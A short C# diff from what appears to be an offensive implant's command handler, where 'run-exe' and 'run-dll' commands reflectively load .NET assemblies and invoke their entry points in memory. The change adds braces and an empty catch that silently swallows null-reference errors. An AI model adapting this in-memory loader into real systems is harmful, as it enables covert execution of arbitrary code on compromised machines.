@@ -291,8 +291,9 @@ public class Program
 				var lTyp = LoadS(qNme + ", " + Ass.FullName);
 				try
 				{
-					if (c.ToLower().StartsWith("run-exe"))
+					if (c.ToLower().StartsWith("run-exe")) {
 						sOut = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs }).ToString();
+					}
 					else if(c.ToLower().StartsWith("run-dll")) 
 					{
 						try
@@ -307,6 +308,7 @@ public class Program
                         sOut = "[-] Error running assembly, unrecognised command: " + c;
                     }
 				}
+				catch(NullReferenceException) {}
 				catch(Exception e)
                 {
                         sOut = "[-] Error running assembly: " + e.Message;
